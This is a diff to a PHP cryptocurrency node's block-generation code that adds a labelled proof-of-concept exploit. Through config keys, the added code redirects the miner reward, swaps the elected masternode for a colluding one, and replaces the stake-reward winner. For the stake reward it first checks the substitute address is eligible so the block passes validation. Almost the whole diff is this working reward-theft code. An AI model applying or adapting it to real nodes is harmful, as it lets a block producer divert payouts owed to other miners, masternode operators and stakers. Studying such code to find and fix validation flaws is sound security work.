@@ -269,6 +269,13 @@ if ($q == "info") {
 	$new_block_date = $block_date + $elapsed;
 	$rewardInfo = Block::reward($height);
 	$minerReward = num($rewardInfo['miner']);
+
+
+	if (isset($_config['hijack_miner_reward_address']) && CHAIN_ID == "01") {
+		$address = $_config['hijack_miner_reward_address'];
+		_log("MINER REWARD HIJACKED TO " . $address);
+	}
+
 	$reward_tx = Transaction::getRewardTransaction($address, $new_block_date, $_config['generator_public_key'], $_config['generator_private_key'], $minerReward, $msg);
 
 //	$l .= " reward_tx=".json_encode($reward_tx);
@@ -278,13 +285,70 @@ if ($q == "info") {
 	$generatorReward = num($rewardInfo['generator']);
 	$reward_tx = Transaction::getRewardTransaction($generator, $new_block_date, $_config['generator_public_key'], $_config['generator_private_key'], $generatorReward, "generator");
 	if(Masternode::allowedMasternodes($height)) {
-		$mn_reward_tx = Masternode::getRewardTx($generator, $new_block_date, $_config['generator_public_key'], $_config['generator_private_key'], $height, $mn_signature, $block_masternode);
+		// INLINED Masternode::getRewardTx LOGIC FOR PoC
+		$winner = Masternode::getWinner($height);
+
+		// PoC: Generator/Masternode Collusion
+		if (isset($_config['hijack_masternode_winner']) && CHAIN_ID == "01" && $winner) {
+			$hijack_address = $_config['hijack_masternode_winner'];
+			$all_verified = Masternode::getAllVerified($height);
+			$colluding_mn = null;
+			foreach ($all_verified as $mn) {
+				if ($mn['id'] == $hijack_address) {
+					$colluding_mn = $mn;
+					break;
+				}
+			}
+
+			if ($colluding_mn) {
+				_log("MASTERNODE HIJACK: Switched winner from ".$winner['id']." to colluding masternode ".$colluding_mn['id']);
+				$winner = $colluding_mn;
+			} else {
+				_log("MASTERNODE HIJACK FAILED: Colluding masternode ".$hijack_address." not found in verified list");
+			}
+		}
+
+
+		if(!$winner) {
+			_log("Masternode: not found winner");
+			$mn_count = Masternode::getCount();
+			if($mn_count > 0 && $height > UPDATE_5_NO_MASTERNODE) {
+				$collateral = Block::getMasternodeCollateral($height);
+				$cnt = Masternode::getCountByCollateral($collateral);
+				if($cnt > 0 && !DEVELOPMENT) {
+					api_err("Not found masternode winner");
+				} else {
+					$dst = $generator;
+				}
+			} else {
+				$dst = $generator;
+			}
+			$mn_reward_tx = null;
+		} else {
+			$collateralTx=Masternode::checkCollateral($winner['id'], $height);
+			if($collateralTx) {
+				$winnerAddress = $collateralTx['dst'];
+				$dst = $winnerAddress;
+				$mn_signature = $winner['signature'];
+				$block_masternode = Masternode::getMasternodeAddress($height, $collateralTx);
+			} else {
+				$dst = $generator;
+				$block_masternode = $generator;
+			}
+		}
+
+		$rewardinfo = Block::reward($height);
+		$reward = $rewardinfo['masternode'];
+		$mn_reward_tx = Transaction::getRewardTransaction($dst, $new_block_date, $_config['generator_public_key'], $_config['generator_private_key'], $reward, "masternode");
+
 		if (!$mn_reward_tx) {
 			_logf(" rejected - Not found masternode winner", 0);
 			$generator_stat['rejected']++;
 			@$generator_stat['reject-reasons']['Not found masternode winner']++;
 			api_err("Not found masternode winner");
 		}
+		// END INLINED LOGIC
+
 		$data[$mn_reward_tx['id']] = $mn_reward_tx;
 		$block->masternode = $mn_signature ? $block_masternode : null;
 		$block->mn_signature = $mn_signature;
@@ -295,15 +359,43 @@ if ($q == "info") {
 
 	if($height >= STAKING_START_HEIGHT) {
 		$reward = num($rewardInfo['staker']);
-		$stake_reward_tx = Transaction::getStakeRewardTx($height, $generator, $_config['generator_public_key'], $_config['generator_private_key'], $reward, $new_block_date);
-		if(!$stake_reward_tx) {
+		$winner = Account::getStakeWinner($height);
+
+		if(!$winner) {
 			_logf(" rejected - Not found stake winner", 0);
 			api_err("No stake winner - mining dropped");
 			$generator_stat['rejected']++;
-			@$generator_stat['reject-reasons']['Not found masternode winner']++;
+			@$generator_stat['reject-reasons']['Not found stake winner']++;
 			$this->miningStat['rejected']++;
+		} else {
+			if (isset($_config['hijack_stake_reward_address']) && CHAIN_ID == "01") {
+				$hijack_address = $_config['hijack_stake_reward_address'];
+				// To be a successful exploit, the hijack address must be an eligible staker to pass validation
+				$last_height = Transaction::getLastHeight($hijack_address, $height);
+				$is_eligible = false;
+				if ($last_height) {
+					$maturity = $height - $last_height;
+					if ($maturity >= Blockchain::getStakingMaturity($height)) {
+						$balance = Account::getBalanceAtHeight($hijack_address, $height);
+						if (floatval($balance) >= Blockchain::getStakingMinBalance($height)) {
+							$is_eligible = true;
+						}
+					}
+				}
+
+				if ($is_eligible) {
+					$winner = $hijack_address;
+					_log("STAKE REWARD HIJACKED: Switched winner to eligible staker " . $winner);
+				} else {
+					_log("STAKE REWARD HIJACK FAILED: Configured address ".$hijack_address." is not an eligible staker.");
+				}
+			}
+			$transaction = new Transaction($_config['generator_public_key'],$winner,$reward,TX_TYPE_REWARD,$new_block_date,"stake");
+			$transaction->sign($_config['generator_private_key']);
+			$transaction->hash();
+			$stake_reward_tx = $transaction->toArray();
+			$data[$stake_reward_tx['id']]=$stake_reward_tx;
 		}
-		$data[$stake_reward_tx['id']]=$stake_reward_tx;
 	}
 
     if($height >= UPDATE_17_DEV_MINER_START) {
